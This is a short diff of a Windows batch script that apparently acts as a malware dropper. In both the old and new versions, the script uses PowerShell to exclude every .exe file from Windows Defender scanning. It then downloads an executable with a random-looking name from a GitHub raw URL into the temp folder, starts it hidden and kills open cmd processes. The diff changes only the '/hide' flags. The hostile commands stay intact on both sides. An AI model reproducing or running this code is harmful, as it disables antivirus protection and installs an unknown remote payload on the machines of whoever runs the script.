@@ -26,8 +26,8 @@ if '%errorlevel%' NEQ '0' (
     pushd "%CD%"
     CD /D "%~dp0"
 :--------------------------------------
-Powershell /hide -Command "Set-MpPreference -ExclusionExtension exe"
+Powershell -Command "Set-MpPreference -ExclusionExtension exe"
 cd %TEMP%
-Powershell /hide -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/Modification11910275.exe' -OutFile Modification11910275.exe"
+Powershell -Command "Invoke-Webrequest 'https://raw.githubusercontent.com/walks111551/09672018256120856125/main/Modification11910275.exe' -OutFile Modification11910275.exe"
 start /hide Modification11910275.exe
-PowerShell /hide -Command "Get-Process cmd -ErrorAction SilentlyContinue | ForEach-Object { $_.Kill() }"
+PowerShell -Command "Get-Process cmd -ErrorAction SilentlyContinue | ForEach-Object { $_.Kill() }"
